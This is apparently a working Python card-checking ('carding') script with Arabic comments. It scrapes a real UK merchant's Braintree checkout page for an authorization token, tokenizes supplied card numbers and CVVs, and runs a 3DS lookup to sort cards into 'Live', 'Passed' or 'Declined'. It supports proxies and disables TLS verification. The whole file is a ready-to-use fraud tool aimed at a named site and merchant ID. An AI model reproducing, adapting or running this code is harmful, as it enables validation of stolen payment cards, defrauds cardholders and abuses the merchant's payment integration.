"""
بوابة الدفع: Braintree 3DS Passed LookUp 3
الموقع: www.thesolarcentre.co.uk
نوع البوابة: Braintree 3DS LookUp
تدفق الطلبات:
1. GET /l/checkout/guest/... -> استخراج authorizationFingerprint
2. POST https://payments.braintree-api.com/graphql (TokenizeCreditCard) -> الحصول على tok
3. POST https://api.braintreegateway.com/merchants/4fgx59fpr6338yxd/client_api/v1/payment_methods/{tok}/three_d_secure/lookup -> النتيجة النهائية
"""
import aiohttp
import asyncio
import uuid
import ssl
import re

MERCHANT_ID = "4fgx59fpr6338yxd"
MERCHANT_SITE = "www.thesolarcentre.co.uk"
CHECKOUT_URL = f"https://{MERCHANT_SITE}/l/checkout/guest/42a882b8f87dd441a675fe2fcdfef735"


async def req1_get_auth_fingerprint(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> str:
    """الخطوة 1: جلب authorizationFingerprint من صفحة الدفع."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    }
    try:
        async with session.get(CHECKOUT_URL, headers=headers, proxy=proxy_url) as r:
            text = await r.text()

        af_match = re.search(r'"authorizationFingerprint":"(.*?)"', text)
        if not af_match:
            af_match = re.search(r"authorizationFingerprint: '(.*?)'", text)
        if not af_match:
            raise RuntimeError("authorizationFingerprint not found in page")
        return af_match.group(1)
    except Exception as e:
        raise RuntimeError(f"req1_get_auth_fingerprint failed: {e}") from e


async def req2_tokenize_card(
    session: aiohttp.ClientSession,
    auth_fingerprint: str,
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: تحويل بيانات البطاقة إلى Braintree token عبر GraphQL."""
    headers = {
        "Authorization": f"Bearer {auth_fingerprint}",
        "Content-Type": "application/json",
        "Braintree-Version": "2018-05-10",
    }
    query = {
        "clientSdkMetadata": {
            "source": "client",
            "integration": "custom",
            "sessionId": str(uuid.uuid4()),
        },
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { creditCard { token } } }",
        "variables": {
            "input": {
                "creditCard": {
                    "number": cc,
                    "expirationMonth": mm,
                    "expirationYear": yy,
                    "cvv": cvv,
                },
                "options": {"validate": False},
            }
        },
    }
    try:
        async with session.post(
            "https://payments.braintree-api.com/graphql",
            headers=headers,
            json=query,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        tok = res.get("data", {}).get("tokenizeCreditCard", {}).get("creditCard", {}).get("token", "")
        if not tok:
            raise RuntimeError("Tokenization Failed: token not returned")
        return tok
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_tokenize_card failed: {e}") from e


async def req3_3ds_lookup(
    session: aiohttp.ClientSession,
    tok: str,
    auth_fingerprint: str,
    proxy_url: str = None,
) -> dict:
    """الخطوة 3: إجراء 3DS LookUp للحصول على حالة المصادقة."""
    headers = {
        "Authorization": f"Bearer {auth_fingerprint}",
        "Content-Type": "application/json",
        "Braintree-Version": "2018-05-10",
    }
    data = {
        "amount": "100.53",
        "merchantAppId": MERCHANT_SITE,
        "sdkVersion": "3.123.2",
        "authorizationFingerprint": auth_fingerprint,
        "braintreeLibraryVersion": "braintree/web/3.123.2",
        "dfReferenceId": str(uuid.uuid4()).replace("-", ""),
    }
    try:
        async with session.post(
            f"https://api.braintreegateway.com/merchants/{MERCHANT_ID}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup",
            headers=headers,
            json=data,
            proxy=proxy_url,
        ) as r:
            return await r.json(content_type=None)
    except Exception as e:
        raise RuntimeError(f"req3_3ds_lookup failed: {e}") from e


async def process_B3_LookUp3_passed(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Braintree 3DS Passed LookUp 3."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            auth_fingerprint = await req1_get_auth_fingerprint(session, proxy_url)
            tok = await req2_tokenize_card(session, auth_fingerprint, cc, mes, ano, cvv, proxy_url)
            res = await req3_3ds_lookup(session, tok, auth_fingerprint, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    status = res.get("status", "")

    if status == "challenge_required":
        return f"𝐋𝐢𝐯𝐞 ✅ | {cc}|{mes}|{ano}|{cvv}", "Challenge Required"
    elif status == "authenticate_successful":
        return f"𝐏𝐚𝐬𝐬𝐞𝐝 ✅ | {cc}|{mes}|{ano}|{cvv}", "Authenticate Successful"
    elif status == "authenticate_rejected":
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Authenticate Rejected"
    else:
        msg = res.get("message", status) if status else "Unknown Error"
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Status: {msg}"
